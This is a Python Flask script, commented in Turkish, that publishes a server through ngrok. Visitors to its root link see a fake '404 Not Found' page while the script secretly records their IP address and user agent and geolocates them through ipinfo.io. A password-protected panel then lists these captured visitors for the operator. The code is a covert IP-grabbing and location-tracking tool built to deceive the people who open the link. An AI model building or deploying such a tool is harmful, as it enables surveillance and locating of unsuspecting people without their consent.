from flask import Flask, request, render_template_string, redirect, url_for, session
from getpass import getpass
from threading import Thread
from pyngrok import ngrok
import requests
import os

app = Flask(__name__)
app.secret_key = "gizli-session-key"  # Flask oturum yönetimi için gerekli
log_kaydi = []

# Panel giriş şifresi
PANEL_SIFRE = "gizlipanel"

def ip_konum_al(ip):
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {
                'ip': ip,
                'user_agent': request.headers.get('User-Agent'),
                'ülke': data.get("country", "Bilinmiyor"),
                'şehir': data.get("city", "Bilinmiyor"),
                'lokasyon': data.get("loc", "Bilinmiyor")
            }
    except Exception:
        pass
    return {
        'ip': ip,
        'user_agent': request.headers.get('User-Agent'),
        'ülke': 'Bilinmiyor',
        'şehir': 'Bilinmiyor',
        'lokasyon': 'Bilinmiyor'
    }

@app.route('/')
def anasayfa():
    ip = request.remote_addr
    log = ip_konum_al(ip)
    log_kaydi.append(log)
    return render_template_string('''
        <h1>404 Not Found</h1>
        <p>The requested URL was not found on the server.</p>
    '''), 404

@app.route('/panel', methods=["GET", "POST"])
def panel():
    if session.get("giris_yapildi"):
        return render_template_string('''
            <h1>📋 Cihaz Paneli</h1>
            <ul>
            {% for log in loglar %}
                <li>
                    <b>IP:</b> {{log.ip}} <br>
                    <b>User-Agent:</b> {{log.user_agent}} <br>
                    <b>Ülke:</b> {{log.ülke}}, <b>Şehir:</b> {{log.şehir}} <br>
                    <b>Lokasyon:</b> {{log.lokasyon}}
                </li><hr>
            {% endfor %}
            </ul>
        ''', loglar=log_kaydi)
    else:
        return redirect(url_for("giris"))

@app.route('/giris', methods=["GET", "POST"])
def giris():
    if request.method == "POST":
        sifre = request.form.get("sifre")
        if sifre == PANEL_SIFRE:
            session["giris_yapildi"] = True
            return redirect(url_for("panel"))
        else:
            return "<h3>❌ Hatalı şifre</h3>"
    return '''
        <form method="post">
            <h2>🔐 Panel Girişi</h2>
            Şifre: <input type="password" name="sifre">
            <input type="submit" value="Giriş">
        </form>
    '''

def flaski_baslat():
    app.run(port=5000)

def ngrok_baslat():
    token = input("🔑 Lütfen NGROK Auth Token'ınızı girin: ").strip()
    os.system(f"ngrok config add-authtoken {token}")
    public_url = ngrok.connect(5000)
    print(f"\n🌐 NGROK Adresi: {public_url}")
    print(f"👀 Panel: {public_url}/panel")
    print(f"🔒 Panel Giriş Sayfası: {public_url}/giris")
    print(f"🕵️  Ziyaretçiler: {public_url}/\n")

DOGRU_KEY = "adminpro"
MAX_DENEME = 5

def key_girisi():
    for hak in range(MAX_DENEME):
        key = getpass("🔐 Ana Key girin (gizli): ")
        if key == DOGRU_KEY:
            print("✅ Giriş başarılı. Sunucu başlatılıyor...")
            return True
        else:
            print(f"❌ Hatalı key. Kalan deneme: {MAX_DENEME - hak - 1}")
    print("🚫 Çok fazla yanlış deneme.")
    return False

if __name__ == '__main__':
    if key_girisi():
        Thread(target=flaski_baslat).start()
        ngrok_baslat()
    else:
        exit()
